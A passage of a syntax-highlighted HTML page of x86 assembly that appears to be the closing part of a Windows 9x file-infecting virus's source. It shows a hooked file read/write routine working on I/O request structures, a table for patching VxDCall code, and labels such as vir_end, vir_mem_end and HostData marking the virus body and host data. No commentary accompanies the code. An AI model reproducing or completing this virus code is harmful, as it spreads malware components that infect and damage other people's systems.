                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_length</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_pos</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_options</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">CFbit</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eflags</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ReadWriteDone</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_pos</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_length</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ReadWriteDone</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; for patch VxDCall code</span><span class="sc0">
</span><span class="sc5">VxDCall_tbl</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDCall0</span><span class="sc4">,</span><span class="sc5">VxDCall1</span><span class="sc4">,</span><span class="sc5">VxDCall2</span><span class="sc4">,</span><span class="sc5">VxDCall3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDCall4</span><span class="sc4">,</span><span class="sc5">VxDCall5</span><span class="sc4">,</span><span class="sc5">VxDCall6</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDCall8</span><span class="sc0">
</span><span class="sc5">VxDCall_tbl_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">VxDCall_tbl</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">vir_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; for define memory data</span><span class="sc0">
</span><span class="sc5">vir_mem_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">vir_end</span><span class="sc0">
                </span><span class="sc1">; for define file data</span><span class="sc0">
</span><span class="sc5">HostData</span><span class="sc0">        </span><span class="sc5">host_data</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">vir_file_end</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
